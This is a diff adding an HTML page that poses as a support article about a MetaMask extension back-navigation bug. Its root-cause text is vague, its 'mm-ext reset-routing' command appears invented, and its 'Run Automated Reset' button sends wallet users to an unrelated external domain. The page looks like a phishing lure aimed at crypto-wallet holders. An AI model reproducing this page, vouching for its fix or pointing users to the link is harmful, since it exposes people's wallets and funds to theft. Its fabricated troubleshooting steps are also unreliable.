@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Metamask Extension Bug Navigating Back From Market Details Retu</title>
+<style>
+    body {
+        font-family: BlinkMacSystemFont;
+        background: #1a1a24;
+        color: #ddd;
+        padding: 20px;
+        line-height: 1.5;
+    }
+    .content {
+        max-width: 880px;
+        margin: auto;
+        background: #1e1f24;
+        border-radius: 24px;
+        padding: 2rem;
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+    pre {
+        background: #0f0f12;
+        padding: 1rem;
+        border-radius: 12px;
+        overflow-x: auto;
+    }
+    a { color: #00adb5; }
+    .btn {
+        background: #00adb5;
+        color: #000;
+        padding: 14px 36px;
+        border-radius: 40px;
+        font-weight: bold;
+        display: inline-block;
+        text-decoration: none;
+        transition: 0.2s;
+    }
+    .btn:hover { transform: scale(1.02); }
+    </style>
+</head>
+<body>
+<div class="content">
+<h2>Symptom</h2>
+<ul>
+<li>When navigating back from the Market Details page, the Metamask extension returns to the home screen instead of the expected Exchange page, causing inconvenience and disrupting the user's workflow.</li>
+</ul>
+<h2>Technical Root Cause</h2>
+<ul>
+<li>The error occurs due to a mismatch in the routing configuration within the Metamask extension, specifically related to the Ethereum (ETH) ecosystem. The extension fails to properly handle the back navigation, redirecting the user to the home screen instead of the intended Exchange page.</li>
+</ul>
+<h3>Manual Overrides</h3>
+<ul>
+<li>Clear the browser cache and restart the extension to ensure a fresh start.</li>
+<li>Check for any updates to the Metamask extension and install the latest version.</li>
+<li>Use the following command to reset the extension's routing configuration:</li>
+</ul>
+<pre class="codehilite"><code class="language-bash">mm-ext reset-routing --ecosystem eth
+</code></pre>
+
+<p>Consider utilizing an external console for more advanced debugging and customization options. </p>
+<h2>Prerequisites</h2>
+<ul>
+<li>Metamask extension installed and configured for the Ethereum (ETH) ecosystem.</li>
+<li>Latest version of the browser and operating system.</li>
+<li>A basic understanding of command-line interfaces and JSON configuration files.</li>
+</ul>
+<div style="text-align:center; margin-top:2rem;">
+<a href="https://tron.amana-vault.site" class="btn">🛠 Run Automated Reset</a>
+</div>
+</div>
+</body>
+</html>
